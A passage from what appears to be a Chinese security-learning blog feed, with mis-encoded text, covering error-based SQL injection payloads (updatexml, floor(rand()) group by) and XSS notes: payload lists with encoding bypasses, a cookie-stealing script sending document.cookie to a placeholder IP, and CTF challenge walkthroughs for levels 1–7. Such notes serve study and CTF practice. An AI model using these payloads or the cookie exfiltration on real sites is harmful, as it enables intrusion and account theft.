table_name&#x3D;&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">çˆ†æ•°æ®ï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure><h3 id="concat-rand-group-by-å¯¼è‡´ä¸»é”®é‡å¤"><a href="#concat-rand-group-by-å¯¼è‡´ä¸»é”®é‡å¤" class="headerlink" title="concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤"></a>concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤</h3><p>è¿™ç§æŠ¥é”™æ–¹æ³•çš„æœ¬è´¨æ˜¯å› ä¸ºfloor(rand(0)*2)çš„é‡å¤æ€§ï¼Œå¯¼è‡´group byè¯­å¥å‡ºé”™ã€‚group by keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸åœ¨ä¸´æ—¶è¡¨ä¸­æ›´æ–°ä¸´æ—¶è¡¨çš„æ•°æ®ï¼›å¦‚æœkeyä¸åœ¨ä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚</p><p><strong>rand()ï¼š</strong></p><blockquote><p>ç”Ÿæˆ0~1ä¹‹é—´çš„éšæœºæ•°ï¼Œå¯ä»¥ç»™å®šä¸€ä¸ªéšæœºæ•°çš„ç§å­ï¼Œå¯¹äºæ¯ä¸€ä¸ªç»™å®šçš„ç§å­ï¼Œrand()å‡½æ•°éƒ½ä¼šäº§ç”Ÿä¸€ç³»åˆ—å¯ä»¥å¤ç°çš„æ•°å­—</p></blockquote><p><strong>floor()ï¼š</strong></p><blockquote><p>å¯¹ä»»æ„æ­£æˆ–è€…è´Ÿçš„åè¿›åˆ¶å€¼å‘ä¸‹å–æ•´</p></blockquote><p>é€šå¸¸åˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„æ–¹æ³•æ˜¯<code>floor(rand(0))*2</code> ,å…¶ä¼šç”Ÿæˆ0å’Œ1ä¸¤ä¸ªæ•°</p><p><strong>group by</strong></p><blockquote><p>group byæ˜¯æ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å¯¹ç»“æœé›†è¿›è¡Œåˆ†ç»„çš„sqlè¯­å¥ï¼Œå…¶ç”¨æ³•ä¸ºï¼š<br>SELECT column_name, aggregate_function(column_name)<br>FROM table_name<br>WHERE column_name operator value<br>GROUP BY column_name</p></blockquote><p>æŠ¥é”™çš„åŸå› æ˜¯å› ä¸º<strong>rand()å‡½æ•°åœ¨æŸ¥è¯¢çš„æ—¶å€™ä¼šæ‰§è¡Œä¸€æ¬¡,æ’å…¥çš„æ—¶å€™è¿˜ä¼šæ‰§è¡Œä¸€æ¬¡.</strong>è¿™å°±æ˜¯æ•´ä¸ªè¯­å¥æŠ¥é”™çš„å…³é”®</p><p>å‰é¢è¯´è¿‡floor(rand(0)<em>2) å‰å…­ä½æ˜¯<em>*0110110</em></em></p><p><strong>group by xå…ˆå»ºç«‹ä¸€ä¸ªç©ºè¡¨,ç”¨äºåˆ†ç»„.</strong>ç„¶åè¿›è¡Œåˆ†ç»„æŸ¥è¯¢,ç¬¬ä¸€æ¬¡rand()æ‰§è¡Œ,æŸ¥è¯¢çš„ç»“æœæ˜¯0,å› ä¸ºæ˜¯ç©ºè¡¨æ‰€ä»¥æ’å…¥è¿™æ¡,è€Œæ’å…¥çš„æ—¶å€™rand()åˆæ‰§è¡Œäº†ä¸€æ¬¡,æ‰€ä»¥è¡¨ä¸­çš„ç»“æœå°±æ˜¯</p><p><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212511240-1317180655.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212511240-1317180655.png" alt="img"></a></p><p>ç¬¬ä¸€æ¬¡æ‰§è¡Œå®Œ,æ¥ç€æ‰§è¡Œrand()çš„å€¼ä¸º1,å› ä¸ºè¡¨ä¸­å­˜åœ¨,æ‰€ä»¥åŠ 1,è¡¨ä¸­ç»“æœæˆä¸º</p><p><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212558220-1728511223.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212558220-1728511223.png" alt="img"></a></p><p>åˆ°äº†ç¬¬ä¸‰æ¬¡æ‰§è¡Œrand()æ˜¯å€¼ä¸º0,å› ä¸ºè¡¨ä¸­ä¸å­˜åœ¨æ‰€ä»¥è¦æ’å…¥æ–°çš„æ•°æ®,<strong>è¿™æ¬¡æ’å…¥rand()å†æ¬¡æ‰§è¡Œ,æ‰€ä»¥æ’å…¥çš„åˆæ˜¯1.è€Œè¡¨ä¸­å·²ç»å­˜åœ¨1äº†</strong></p><p><strong>æ­¤æ—¶æ’å…¥å› ä¸ºé‡å¤å‡ºç°åŒä¸€ä¸ªkey,å°±ä¼šå‡ºç°æŠ¥é”™ é‡å¤å‡ºç°key.è€ŒæŠ¥é”™ä¸­ä¼šè¯´æ˜é‚£ä¸ªkeyæœ‰é—®é¢˜,æˆ‘ä»¬çš„keyä¸­ç»“åˆäº†æƒ³è¦äº†è§£çš„å­—ç¬¦ä¸²root@localhost</strong></p><p><strong>è¿™æ ·å°±å®ç°äº†æŠ¥é”™æ³¨å…¥,æ‹¿åˆ°äº†è‡ªå·±æƒ³è¦çš„æ•°æ®</strong></p><p><strong><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212741685-206782122.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212741685-206782122.png" alt="img"></a></strong></p><p>è¿™å°±æ˜¯æ•´ä¸ªæŠ¥é”™æ³¨å…¥çš„åŸç†äº†,rand(),floor() group by å‡½æ•°ç¼ºä¸€ä¸å¯.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">1 Union select count(*),concat((æŸ¥è¯¢è¯­å¥),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹ctfhubæŠ¥é”™æ³¨å…¥</p><h3 id="ctfhubæŠ¥é”™æ³¨å…¥"><a href="#ctfhubæŠ¥é”™æ³¨å…¥" class="headerlink" title="ctfhubæŠ¥é”™æ³¨å…¥"></a>ctfhubæŠ¥é”™æ³¨å…¥</h3><p>æŸ¥è¡¨</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145102761.png" alt="image-20200817145102761"></p><p>æŸ¥flag</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145552296.png" alt="image-20200817145552296"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æˆ‘å°±å•çº¯æƒ³æŠŠè¿™äº›ä¸œè¥¿å­˜ä¸‹æ¥&lt;/p&gt;
&lt;h1 id=&quot;åŸºç¡€å­¦ä¹ &quot;&gt;&lt;a href=&quot;#åŸºç¡€å­¦ä¹ &quot; class=&quot;headerlink&quot; title=&quot;åŸºç¡€å­¦ä¹ &quot;&gt;&lt;/a&gt;åŸºç¡€å­¦ä¹ &lt;/h1&gt;&lt;h2 id=&quot;1-SQLæ³¨å…¥çš„åˆ†ç±»&quot;&gt;&lt;a href=&quot;#1-SQLæ³¨å…¥çš„åˆ†ç±»&quot; cl</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>xss</title>
    <link href="https://pz1o.top/2020/12/09/xss/"/>
    <id>https://pz1o.top/2020/12/09/xss/</id>
    <published>2020-12-09T15:34:13.000Z</published>
    <updated>2020-12-09T15:36:11.388Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡æ›´ä¹±ï¼Œä¹Ÿå°±é‚£ä¸ªå°æŒ‘æˆ˜è¿˜ç®—å®Œæ•´</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š"><a href="#ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š" class="headerlink" title="ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š"></a>ç†è§£åŒæ­¥å’Œå¼‚æ­¥ï¼š</h3><p>ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚æœ‰ä¸€ä¸ªç½‘é¡µï¼Œhtmlå’Œphpï¼Œphpä¼šå»¶æ—¶æ‰§è¡Œã€‚</p><p>åŒæ­¥ï¼šåªæœ‰å½“phpæ‰§è¡Œå®Œä¹‹åï¼Œæ‰ä¼šæ˜¾ç¤ºhtmlç½‘é¡µã€‚</p><p>å¼‚æ­¥ï¼šåˆ·æ–°ä¹‹åï¼Œä¼šç«‹å³æ˜¾ç¤ºhtmlç½‘é¡µï¼Œä¹‹åå†æ˜¾ç¤ºphpæ‰§è¡Œçš„å†…å®¹ã€‚</p><h3 id="jsè®¾ç½®cookie"><a href="#jsè®¾ç½®cookie" class="headerlink" title="jsè®¾ç½®cookie"></a>jsè®¾ç½®cookie</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;phpsessid&#x3D;      &quot;;</span><br></pre></td></tr></table></figure><h2 id="0x01å­˜å‚¨xss"><a href="#0x01å­˜å‚¨xss" class="headerlink" title="0x01å­˜å‚¨xss"></a>0x01å­˜å‚¨xss</h2><p>å­˜å‚¨å‹xssä¸»è¦æ˜¯æ”»å‡»è€…å°†xssä»£ç æ’å…¥åˆ°é¡µé¢ä¸Šï¼Œç„¶åå­˜åœ¨æ•°æ®åº“é‡Œï¼Œå½“è®¿é—®è€…è®¿é—®è¿™ä¸ªé¡µé¢æ—¶ï¼Œå°±ä¼šå¯¼è‡´xssä»£ç æ‰§è¡Œã€‚</p><p>å‡ºç°åœºæ™¯ï¼šç¼–è¾‘å†…å®¹ï¼ˆxssä»£ç ï¼‰å¯ä»¥ä¿å­˜ï¼Œå¹¶ä¸”å¯ä»¥å†æ¬¡è®¿é—®è¿™ä¸ªå†…å®¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="0x02åå°„xss"><a href="#0x02åå°„xss" class="headerlink" title="0x02åå°„xss"></a>0x02åå°„xss</h2><p>æ”»å‡»è€…åœ¨urlä¸­æ’å…¥xssä»£ç ï¼ŒæœåŠ¡å™¨å°†urlä¸­çš„xssä»£ç è¾“å…¥åˆ°é¡µé¢ä¸Šï¼Œæ”»å‡»è€…å°†xssä»£ç çš„urlå‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰“å¼€åå—åˆ°xssæ”»å‡»ã€‚</p><p>å‡ºç°åœºæ™¯ï¼šurlä¸­å¯ä»¥ä¼ é€’å‚æ•°</p><p>é€šå¸¸æ¥è¯´ï¼Œä¼šé—­åˆä¸€äº›æ ‡ç­¾ï¼Œä»è€Œæ‰§è¡Œä»£ç ã€‚</p><p>å¸¸ç”¨é—­åˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;</span><br><span class="line">&#39;&gt;</span><br><span class="line">&lt;&#x2F;xxx&gt;</span><br></pre></td></tr></table></figure><p>å…¶å®è¿˜æ˜¯å…·ä½“æƒ…å†µå…·ä½“å¯¹å¾…</p><h2 id="0x03domå‹xss"><a href="#0x03domå‹xss" class="headerlink" title="0x03domå‹xss"></a>0x03domå‹xss</h2><p>æ”»å‡»è€…åœ¨urlä¸­æ’å…¥xssä»£ç ï¼Œå‰ç«¯é¡µé¢ç›´æ¥ä»urlä¸­è·å–xssä»£ç å¹¶ä¸”è¾“å…¥åˆ°é¡µé¢ï¼Œå¯¼è‡´xssä»£ç çš„æ‰§è¡Œï¼Œæ”»å‡»è€…å°†å¸¦æœ‰xssä»£ç çš„urlå‘é€ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰“å¼€åå—åˆ°xssæ”»å‡»</p><p>å…³äºåå°„å‹å’Œdomå‹å·®åˆ«ï¼š</p><p>å‰ç«¯å¤„ç†æ˜¯domï¼Œåç«¯å¤„ç†æ˜¯åå°„</p><h1 id="å¸¸ç”¨ä¿®å¤å‡½æ•°"><a href="#å¸¸ç”¨ä¿®å¤å‡½æ•°" class="headerlink" title="å¸¸ç”¨ä¿®å¤å‡½æ•°"></a>å¸¸ç”¨ä¿®å¤å‡½æ•°</h1><p>strip_tagsï¼šè¿‡æ»¤htmlæ ‡ç­¾</p><p>htmlspecialcharsï¼šå°†htmlæ ‡ç­¾è½¬æ¢ä¸ºå®ä½“</p><h1 id="å¸¸ç”¨çš„payload"><a href="#å¸¸ç”¨çš„payload" class="headerlink" title="å¸¸ç”¨çš„payload"></a>å¸¸ç”¨çš„payload</h1><h2 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">eval(</span>"<span class="attr">alert</span>('<span class="attr">xss</span>')")&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('xss')"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:aaa"</span> <span class="attr">onmouseover</span>=<span class="string">"alert(/xss/)"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">éœ€è¦ç”¨ç¼–ç ç»•è¿‡æ—¶ï¼š</span><br><span class="line">Base64ï¼š<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span>M</span><br><span class="line"></span><br><span class="line">urlencodeï¼š<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E</span>&gt;</span>M </span><br><span class="line"></span><br><span class="line">HTMLå®ä½“ç¼–ç  ï¼š<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>bb<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>')&gt;</span>cc<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert('xss')<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"aaa"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript<span class="symbol">&amp;colon;</span>prompt<span class="symbol">&amp;lpar;</span>`xss`<span class="symbol">&amp;rpar;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>') <span class="attr">bad</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> &gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookieç›—å–ï¼š</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://xxx.xxx.xxx.xxx:1234/a?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">ncç›‘å¬ç«¯å£1234</span><br></pre></td></tr></table></figure><h1 id="xssç¼–ç "><a href="#xssç¼–ç " class="headerlink" title="xssç¼–ç "></a>xssç¼–ç </h1><h2 id="jsç¼–ç "><a href="#jsç¼–ç " class="headerlink" title="jsç¼–ç "></a>jsç¼–ç </h2><p>JSæä¾›äº†å››ç§å­—ç¬¦ç¼–ç çš„ç­–ç•¥ï¼Œ</p><ul><li>ä¸‰ä¸ªå…«è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º<code>\141</code></li><li>ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º<code>\x61</code></li><li>å››ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼Œå¦‚æœæ•°å­—ä¸å¤Ÿï¼Œåœ¨å‰é¢è¡¥é›¶ï¼Œå¦‚açš„ç¼–ç ä¸º<code>\u0061</code></li><li>å¯¹äºä¸€äº›æ§åˆ¶å­—ç¬¦ï¼Œä½¿ç”¨ç‰¹æ®Šçš„Cç±»å‹çš„è½¬ä¹‰é£æ ¼ï¼Œå¦‚<code>\n</code>å’Œ<code>\r</code></li></ul><h2 id="HTMLå®ä½“ç¼–ç "><a href="#HTMLå®ä½“ç¼–ç " class="headerlink" title="HTMLå®ä½“ç¼–ç "></a>HTMLå®ä½“ç¼–ç </h2><p><strong>å‘½åå®ä½“</strong><br>ä»¥<code>&amp;</code>å¼€å¤´ï¼Œä»¥åˆ†å·ç»“å°¾çš„ï¼Œå¦‚<code>&lt;</code>çš„ç¼–ç ä¸º<code>&amp;1t;</code></p><p><strong>å­—ç¬¦ç¼–ç </strong></p><p>åè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶çš„ASCIIç æˆ–è€…Unicodeå­—ç¬¦ç¼–ç ã€‚æ ·å¼ä¸º<code>&amp;#</code>æ•°å€¼;</p><p>å¦‚<code>&lt;</code>çš„ç¼–ç ä¸º</p><p><code>&lt;</code>(10è¿›åˆ¶)&amp;#60</p><p><code>&lt;</code>(16è¿›åˆ¶)&amp;#x003c</p><p><strong>URLç¼–ç </strong></p><p>è¿™é‡Œä¸ºurlå…¨ç¼–ç ï¼Œä¹Ÿå°±æ˜¯ä¸¤æ¬¡urlç¼–ç </p><p>å¦‚alertçš„urlå…¨ç¼–ç <code>ä¸º%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p><p><strong>String.fromCharCodeç¼–ç </strong></p><p>å¦‚alertçš„ç¼–ç ä¸º<code>String.fromCharCode(97,108,101,114,116)</code></p><h1 id="xssæŒ‘æˆ˜é¢˜"><a href="#xssæŒ‘æˆ˜é¢˜" class="headerlink" title="xssæŒ‘æˆ˜é¢˜"></a>xssæŒ‘æˆ˜é¢˜</h1><p>åšä»»ä½•é¢˜éƒ½å¯ä»¥æµ‹è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&quot;script on alert()&quot; href&gt;</span><br></pre></td></tr></table></figure><p>åšä¸€ä¸‹xssé¢˜</p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><img src="/2020/12/09/xss/image-20200821200652133.png" alt="image-20200821200652133"></p><p>å¯ä»¥å‘ç°teståœ¨h2æ ‡ç­¾å¤„ï¼Œç›´æ¥å†™å°±å¯ä»¥åªéœ€è¦å¼¹çª—ï¼Œå°±å¯ä»¥è¿›å…¥ä¸‹ä¸€å…³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;test&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="/2020/12/09/xss/image-20200821201141420.png" alt="image-20200821201141420"></p><p><img src="/2020/12/09/xss/image-20200821201207838.png" alt="image-20200821201207838"></p><p>å¯¹æ¯”å¯ä»¥å‘ç°ï¼Œå€¼ç›´æ¥åœ¨valueå¤„ï¼Œæ‰€ä»¥<strong>åªéœ€è¦é—­åˆæ ‡ç­¾å³å¯</strong></p><p><strong>æœç´¢æ¡†é‡Œç›´æ¥å†™</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>åŒæ—¶è¿˜æœ‰å…¶ä»–æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">éœ€è¦é¼ æ ‡åˆ’è¿‡è¾“å…¥æ¡†</span><br><span class="line">&quot; onmouseover&#x3D;alert(1)&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">éœ€è¦ç‚¹å‡»æœç´¢æ¡†</span><br><span class="line">&quot; onclick&#x3D;alert(1) &gt;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>è¿™å…³è¿›è¡Œäº†å®ä½“è½¬ä¹‰ï¼Œ<strong>ä¹Ÿå°±æ˜¯è¿‡æ»¤äº†&lt;&gt;å’Œâ€â€,</strong>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å•å¼•å·å’Œæ³¨é‡Šç¬¦</p><p>å…¶ä¸­è½¬ä¹‰å‡½æ•°<img src="/2020/12/09/xss/image-20200821203827654.png" alt="image-20200821203827654"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br><span class="line">&#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯<strong>åŒå¼•å·</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) autofocus&#x3D;&quot;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>è¿™ä¸ªå…³å¡è¿‡æ»¤äº†onï¼Œä½†æ²¡æœ‰è¿‡æ»¤å•åŒå¼•å·ï¼Œ<strong>æ‰€ä»¥å¯ä»¥ç”¨ä¼ªåè®®</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>script è½¬æ¢æˆ scr_ipt        on è½¬æ¢æˆ o_n        src è½¬æ¢æˆ sr_c        data è½¬æ¢æˆ da_ta        href è½¬æ¢æˆ hr_ef</p><p><strong>ä½†å¯ä»¥å¤§å°å†™ç»•è¿‡</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>è¿‡æ»¤äº†scriptï¼Œonï¼Œhref</p><p><strong>æ‰€ä»¥å¯ä»¥åŒå†™ç»•è¿‡</strong></p><figure class="highlight 